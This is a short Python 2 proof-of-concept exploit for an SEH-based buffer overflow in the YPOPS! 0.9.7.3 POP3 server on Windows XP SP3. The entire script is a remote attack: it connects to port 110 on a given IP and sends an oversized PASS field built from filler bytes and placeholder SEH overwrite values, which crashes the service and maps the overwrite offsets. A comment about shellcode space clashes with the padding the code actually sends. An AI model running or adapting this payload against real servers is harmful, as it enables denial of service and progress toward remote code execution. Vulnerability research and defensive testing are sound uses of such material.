# Version:0.9.7.3
# Tested on: Windows XP SP3
 
#!/usr/bin/python
# All modules are SafeSEH protected in service pack 3.
 
 
import socket, sys
 
print "\n ========================================"
print "  YPOPS! v 0.9.7.3 Buffer Overflow (SEH)"
print "  Proof of Concept by Blake  "
print "  Tested on Windows XP Pro SP 3 "
print " ========================================\n"
 
 
if len(sys.argv) != 2:
    print "Usage: %s <ip>\n" % sys.argv[0]
    sys.exit(0)
 
host = sys.argv[1]
port = 110
 
buffer = "\x41" * 1663
buffer += "\x42" * 4               # next seh
buffer += "\x43" * 4               # seh handler
buffer += "\x44" * 2000        # 136 bytes of space for shellcode
 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host,port))
    print "[+] Connecting to server...\n"
    s.recv(1024)
    s.send('USER blake\r\n')
    s.recv(1024)
    print "[+] Sending buffer\n"
    s.send('PASS ' + buffer + '\r\n')
    s.recv(1024)
    s.close()
    print "[+] Done.\n"
except:
    print "[-] Could not connect to server!\n"